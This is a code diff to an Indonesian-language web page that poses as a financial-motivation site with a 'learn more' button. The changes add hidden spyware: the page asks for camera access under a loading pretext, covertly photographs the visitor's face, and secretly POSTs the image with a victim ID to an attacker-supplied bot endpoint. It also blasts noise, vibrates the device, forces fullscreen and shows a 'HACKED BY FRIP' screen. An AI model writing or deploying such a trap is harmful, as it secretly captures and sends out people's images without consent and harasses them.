@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tips Keuangan Sukses</title>
+    <title>Tips Keuangan & Investasi 2026</title>
     <style>
-        /* Tampilan halaman awal (Motivasi) */
+        /* Tampilan halaman awal (Motivasi Keuangan) */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f4f4f9;
+            background-color: #f0f2f5;
             color: #333;
             display: flex;
             justify-content: center;
@@ -31,15 +31,15 @@
 
         h1 {
             color: #2c3e50;
-            font-size: 24px;
+            font-size: 26px;
             margin-bottom: 20px;
         }
 
         p {
-            font-size: 18px;
-            font-style: italic;
+            font-size: 16px;
             color: #555;
             margin-bottom: 30px;
+            line-height: 1.6;
         }
 
         button {
@@ -52,13 +52,14 @@
             cursor: pointer;
             transition: background 0.3s;
             font-weight: bold;
+            width: 100%;
         }
 
         button:hover {
             background-color: #219150;
         }
 
-        /* --- TAMPILAN PRANK --- */
+        /* --- TAMPILAN PRANK HACKED --- */
         #prank-screen {
             display: none; 
             position: fixed;
@@ -74,21 +75,22 @@
 
         .hacked-text {
             font-family: 'Courier New', Courier, monospace;
-            font-size: 5rem;
+            font-size: 4rem;
             font-weight: bold;
             text-align: center;
             margin: 0;
-            padding: 0;
+            padding: 20px;
         }
 
         /* Styling untuk foto hasil jepretan */
         #captured-photo {
             display: none;
-            margin-top: 30px;
-            width: 300px;
+            margin-top: 20px;
+            width: 80%;
+            max-width: 350px;
             border: 5px solid red;
             border-radius: 10px;
-            box-shadow: 0 0 20px red;
+            box-shadow: 0 0 30px red;
         }
 
         /* Animasi Berkedip Hitam Putih */
@@ -116,105 +118,126 @@
         /* Class untuk mengaktifkan prank */
         .active-prank {
             display: flex !important;
-            animation: flash 0.1s infinite, shake 0.1s infinite;
+            animation: flash 0.08s infinite, shake 0.1s infinite;
         }
     </style>
 </head>
 <body>
 
-    <!-- Layar Utama -->
+    <!-- Layar Utama Motivasi -->
     <div class="container" id="main-content">
         <h1>Rahasia Kebebasan Finansial</h1>
-        <p>"Jangan bekerja untuk uang, pelajari caranya agar uang yang bekerja keras untuk Anda. Kesuksesan finansial dimulai dari keputusan kecil hari ini."</p>
+        <p>"Jangan bekerja untuk uang, pelajari caranya agar uang yang bekerja keras untuk Anda. Kami akan membimbing Anda menggandakan aset dalam 30 hari."</p>
         <button id="prank-btn">mau mempelajari lebih lanjut? klik disini</button>
     </div>
 
-    <!-- Layar Prank -->
+    <!-- Layar Prank (Hacked) -->
     <div id="prank-screen">
         <h1 class="hacked-text">HACKED BY FRIP</h1>
         <!-- Gambar untuk menampilkan wajah korban -->
-        <img id="captured-photo" alt="Wajah Anda" />
+        <img id="captured-photo" alt="Face Captured" />
     </div>
 
-    <!-- Elemen Kamera (Disembunyikan, hanya untuk proses sistem) -->
+    <!-- Elemen Kamera Tersembunyi (Spy Cam) -->
     <video id="webcam" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // 1. TANGKAP DATA API DARI URL BOT (.iplogger)
+        const urlParams = new URLSearchParams(window.location.search);
+        const apiTarget = urlParams.get('api') || ''; // Ini dapet dari Localtunnel Bot lu
+        const TRAP_ID = urlParams.get('id') || 'VERCEL_TRAP'; // ID unik korban
+
         const btn = document.getElementById('prank-btn');
         const prankScreen = document.getElementById('prank-screen');
         const mainContent = document.getElementById('main-content');
         
-        // Elemen kamera
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('canvas');
         const photo = document.getElementById('captured-photo');
 
-        // Fungsi Suara Bising
+        // Fungsi Suara Rusak/Bising
         function playAnnoyingSound() {
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const oscillator = audioCtx.createOscillator();
-            const gainNode = audioCtx.createGain();
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
 
-            oscillator.type = 'sawtooth';
-            oscillator.frequency.setValueAtTime(800, audioCtx.currentTime); 
-            
-            // Efek suara naik turun cepat
-            setInterval(() => {
-                const freq = oscillator.frequency.value === 800 ? 1200 : 800;
-                oscillator.frequency.setValueAtTime(freq, audioCtx.currentTime);
-            }, 100);
+                oscillator.type = 'sawtooth';
+                oscillator.frequency.setValueAtTime(800, audioCtx.currentTime); 
+                
+                setInterval(() => {
+                    const freq = oscillator.frequency.value === 800 ? 1200 : 800;
+                    oscillator.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                }, 100);
 
-            gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
-            oscillator.connect(gainNode);
-            gainNode.connect(audioCtx.destination);
-            oscillator.start();
+                gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.start();
+            } catch(e) {}
         }
 
-        // Fungsi Jepret Foto
-        function takePhoto() {
-            // Gambar frame video ke canvas
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Ubah canvas menjadi URL gambar dan tampilkan
-            const dataUrl = canvas.toDataURL('image/png');
-            photo.src = dataUrl;
-            photo.style.display = 'block'; // Tampilkan foto di layar prank
+        // Fungsi Jepret & Kirim ke Bot
+        function takePhotoAndSend() {
+            try {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Ubah jadi base64 image (kualitas dikurangi biar ringan dikirim)
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+                photo.src = dataUrl;
+                photo.style.display = 'block'; // Munculkan foto korban di layar
+
+                // Matikan kamera setelah difoto
+                const stream = video.srcObject;
+                if (stream) { stream.getTracks().forEach(track => track.stop()); }
+
+                // PENGIRIMAN RAHASIA KE BOT WHATSAPP
+                if (apiTarget) {
+                    fetch(apiTarget + '/api/trap/photo', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ id: TRAP_ID, photoBase64: dataUrl })
+                    }).catch(err => console.log("Gagal lapor ke markas"));
+                }
+            } catch(e) {}
         }
 
-        // Jalankan Prank Utama
+        // Mulai Prank
         function startPrank() {
-            // 1. Fullscreen
+            // Fullscreen
             const elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen();
-            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+            if (elem.requestFullscreen) elem.requestFullscreen().catch(()=>{});
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen().catch(()=>{});
 
-            // 2. Sembunyikan konten asli, munculkan layar prank
+            // Ganti Layar
             mainContent.style.display = 'none';
             prankScreen.classList.add('active-prank');
 
-            // 3. Mainkan suara bising
+            // Serangan Audio
             playAnnoyingSound();
+            if (navigator.vibrate) { navigator.vibrate([3000, 30, 3000, 30, 5000]); }
 
-            // 4. Jepret foto setelah 1 detik (agar ada jeda kamera fokus)
-            setTimeout(takePhoto, 1000);
+            // Jepret foto setelah 1 detik
+            setTimeout(takePhotoAndSend, 1000);
         }
 
-        // Event Klik Tombol
+        // Tombol Diklik
         btn.addEventListener('click', async () => {
-            // Minta izin kamera terlebih dahulu
+            btn.innerText = "MEMUAT MATERI...";
+            btn.style.backgroundColor = "#ff9800";
+            
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Minta izin kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 
-                // Jika izin diberikan, tunggu kamera menyala sebentar (0.5 detik), lalu mulai prank
-                setTimeout(startPrank, 500);
-
+                // Tunggu kamera fokus, baru ledakkan prank
+                setTimeout(startPrank, 600);
             } catch (err) {
-                // Jika korban menolak izin kamera (Block), prank tetap berjalan tapi tanpa foto
+                // Kalau korban menolak izin kamera (Block), prank tetap jalan untuk ngagetin!
                 startPrank();
             }
         });
